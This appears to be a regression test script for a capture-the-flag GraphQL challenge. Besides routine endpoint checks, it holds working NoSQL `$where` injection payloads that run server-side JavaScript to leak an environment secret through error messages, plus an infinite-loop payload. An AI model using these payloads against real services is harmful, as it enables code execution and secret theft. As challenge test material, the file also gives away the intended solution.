import assert from 'node:assert/strict';

const baseUrl = (process.env.CHALLENGE_URL ?? 'http://127.0.0.1:18081').replace(/\/$/, '');
const query = 'query TaskGroupSearch($filter: JSON) { taskGroups(filter: $filter) { edges { node { taskGroupId name state } } } }';

async function graphql(body) {
  const response = await fetch(`${baseUrl}/graphql`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  return { response, body: await response.json() };
}

const health = await fetch(`${baseUrl}/healthz`);
assert.equal(health.status, 200);
assert.equal((await health.json()).service, 'graphql-gateway');

const home = await fetch(`${baseUrl}/`);
assert.equal(home.status, 200);
const homeText = await home.text();
assert.match(homeText, /GraphQL Gambit/);
assert.doesNotMatch(homeText, /flag\{|PROXY_SECRET/i);

const script = await fetch(`${baseUrl}/assets/explorer.js`);
assert.equal(script.status, 200);
assert.match(await script.text(), /sourceMappingURL=explorer\.js\.map/);

const map = await fetch(`${baseUrl}/assets/explorer.js.map`);
assert.equal(map.status, 200);
const mapText = JSON.stringify(await map.json());
assert.match(mapText, /filter\.tasks/);
assert.match(mapText, /schema\.graphql/);
assert.doesNotMatch(mapText, /flag\{|PROXY_SECRET|\$where/i);

const schema = await fetch(`${baseUrl}/assets/schema.graphql`);
assert.equal(schema.status, 200);
const schemaText = await schema.text();
assert.match(schemaText, /scalar JSON/);
assert.match(schemaText, /taskGroups\(filter: JSON\)/);

const introspection = await graphql({ query: '{ __schema { types { name } } }', variables: {} });
assert.equal(introspection.response.status, 200);
assert.match(introspection.body.errors[0].message, /introspection is disabled/i);

const normal = await graphql({ query, variables: { filter: { tasks: { state: { $eq: 'running' } } } } });
assert.equal(normal.response.status, 200);
assert.equal(normal.body.data.taskGroups.edges.length, 1);
assert.equal(normal.body.data.taskGroups.edges[0].node.taskGroupId, 'grp-firefly-1042');
assert.doesNotMatch(JSON.stringify(normal.body), /flag\{/i);

const wrongShape = await graphql({ query, variables: { filter: { $where: "(()=>{throw new Error(process.env.FLAG)})()" } } });
assert.equal(wrongShape.response.status, 200);
assert.match(wrongShape.body.errors[0].message, /filter\.tasks/);
assert.doesNotMatch(JSON.stringify(wrongShape.body), /flag\{/i);

const queryInjection = await graphql({
  query: `${query} # (()=>{throw new Error(process.env.FLAG)})()`,
  variables: { filter: { tasks: { state: 'completed' } } },
});
assert.equal(queryInjection.response.status, 200);
assert.equal(queryInjection.body.data.taskGroups.edges.length, 1);
assert.doesNotMatch(JSON.stringify(queryInjection.body), /flag\{/i);

const malformed = await fetch(`${baseUrl}/graphql`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{',
});
assert.equal(malformed.status, 400);

const directInternal = await fetch(`${baseUrl}/internal/graphql`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}',
});
assert.equal(directInternal.status, 404);

const solved = await graphql({
  query,
  variables: { filter: { tasks: { $where: "(()=>{throw new Error(process.env.FLAG)})()" } } },
});
assert.equal(solved.response.status, 200);
assert.equal(solved.body.errors[0].extensions.code, 'INTERNAL_SERVER_ERROR');
assert.match(solved.body.errors[0].message, /flag\{[^\r\n}]+\}/i);
assert.doesNotMatch(JSON.stringify(solved.body), /PROXY_SECRET/i);

const timeout = await graphql({ query, variables: { filter: { tasks: { $where: '(()=>{while(true){} return true})()' } } } });
assert.equal(timeout.response.status, 200);
assert.match(timeout.body.errors[0].message, /timed out|worker stopped/i);

console.log('graphql-gambit regression: discovery, normal filter, failed shapes, bounded evaluator, and intended error-channel RCE passed');
